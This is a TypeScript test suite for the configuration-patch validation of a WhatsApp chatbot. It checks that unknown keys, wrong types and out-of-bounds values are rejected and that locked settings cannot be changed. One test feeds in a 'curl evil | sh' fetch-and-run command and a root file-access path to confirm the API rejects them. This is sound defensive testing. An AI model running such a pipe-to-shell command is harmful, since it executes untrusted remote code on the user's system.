import { describe, expect, test } from "bun:test";
import { applyConfigPatch, normalizeConfig } from "../src/config";

const base = normalizeConfig({ claudeTriggerCommand: "", allowedDirectJids: ["1@s.whatsapp.net"] });

describe("applyConfigPatch", () => {
  test("applies known keys with the right type", () => {
    const { config, rejectedKeys } = applyConfigPatch(base, {
      claudeMediatorEnabled: true,
      dailyMessageLimit: 150,
      allowedDirectJids: ["2@s.whatsapp.net"]
    });
    expect(rejectedKeys).toEqual([]);
    expect(config.claudeMediatorEnabled).toBe(true);
    expect(config.dailyMessageLimit).toBe(150);
    expect(config.allowedDirectJids).toEqual(["2@s.whatsapp.net"]);
  });

  test("never lets the API set the shell trigger command or file-access roots", () => {
    const { config, rejectedKeys } = applyConfigPatch(base, {
      claudeTriggerCommand: "curl evil | sh",
      localFileAllowedRoots: ["/"]
    });
    expect(config.claudeTriggerCommand).toBe("");
    expect(config.localFileAllowedRoots).toEqual(base.localFileAllowedRoots);
    expect(rejectedKeys.sort()).toEqual(["claudeTriggerCommand", "localFileAllowedRoots"]);
  });

  test("echoing back unchanged locked values (full-config saves) is not an error", () => {
    const { rejectedKeys } = applyConfigPatch(base, { ...base });
    expect(rejectedKeys).toEqual([]);
  });

  test("rejects unknown keys, wrong types, unknown enum members and out-of-bounds numbers", () => {
    const { config, rejectedKeys } = applyConfigPatch(base, {
      notAKey: 1,
      dailyMessageLimit: "lots",
      directChatMode: "everyone",
      toolLoopMaxSteps: 99
    });
    // BUG-10: values normalisation would replace are reported, and the current value is kept.
    expect(rejectedKeys.sort()).toEqual(["dailyMessageLimit", "directChatMode", "notAKey", "toolLoopMaxSteps"]);
    expect(config.dailyMessageLimit).toBe(base.dailyMessageLimit);
    expect(config.directChatMode).toBe(base.directChatMode);
    expect(config.toolLoopMaxSteps).toBe(base.toolLoopMaxSteps);
    expect("notAKey" in config).toBe(false);
  });
});

describe("applyConfigPatch value validation (BUG-09, BUG-10)", () => {
  test("an invalid enum member keeps the current value instead of resetting to the default", () => {
    const current = { ...base, directChatMode: "all" as const };
    const { config, rejectedKeys } = applyConfigPatch(current, { directChatMode: "ALL" });
    expect(rejectedKeys).toEqual(["directChatMode"]);
    expect(config.directChatMode).toBe("all");
  });

  test("negative, zero, fractional and non-finite windows/limits are rejected", () => {
    const { config, rejectedKeys } = applyConfigPatch(base, {
      historyWindow: -3,
      senderHistoryWindow: 0,
      memoryTopK: 0.5,
      dailyMessageLimit: -5,
      selfChatDigestHour: 24
    });
    expect(rejectedKeys.sort()).toEqual(["dailyMessageLimit", "historyWindow", "memoryTopK", "selfChatDigestHour", "senderHistoryWindow"]);
    expect(config.historyWindow).toBe(base.historyWindow);
    expect(config.dailyMessageLimit).toBe(base.dailyMessageLimit);
  });

  test("min reply delay above max is rejected; valid values still apply", () => {
    const bad = applyConfigPatch(base, { minReplyDelayMs: 9_000, maxReplyDelayMs: 1 });
    expect(bad.rejectedKeys.sort()).toEqual(["maxReplyDelayMs", "minReplyDelayMs"]);
    expect(bad.config.minReplyDelayMs).toBeLessThanOrEqual(bad.config.maxReplyDelayMs);
    const ok = applyConfigPatch(base, { historyWindow: 30, dailyMessageLimit: 0, minReplyDelayMs: 100, maxReplyDelayMs: 200 });
    expect(ok.rejectedKeys).toEqual([]);
    expect([ok.config.historyWindow, ok.config.dailyMessageLimit, ok.config.minReplyDelayMs]).toEqual([30, 0, 100]);
  });

  test("echoing back the whole current config still reports nothing", () => {
    expect(applyConfigPatch(base, { ...base }).rejectedKeys).toEqual([]);
  });
});

describe("normalizeConfig JID lists", () => {
  test("unquoted numeric YAML entries become strings; junk is dropped", () => {
    const config = normalizeConfig({
      allowedDirectJids: [919876543210, " 1@s.whatsapp.net ", null, ""] as unknown as string[],
      claudeMediatorChats: [12345] as unknown as string[]
    });
    expect(config.allowedDirectJids).toEqual(["919876543210", "1@s.whatsapp.net"]);
    expect(config.claudeMediatorChats).toEqual(["12345"]);
  });
});

describe("repliesPaused via applyConfigPatch", () => {
  test("is accepted from the API and stays off by default", () => {
    expect(base.repliesPaused).toBe(false);
    const { config, rejectedKeys } = applyConfigPatch(base, { repliesPaused: true });
    expect(rejectedKeys).toEqual([]);
    expect(config.repliesPaused).toBe(true);
  });
});
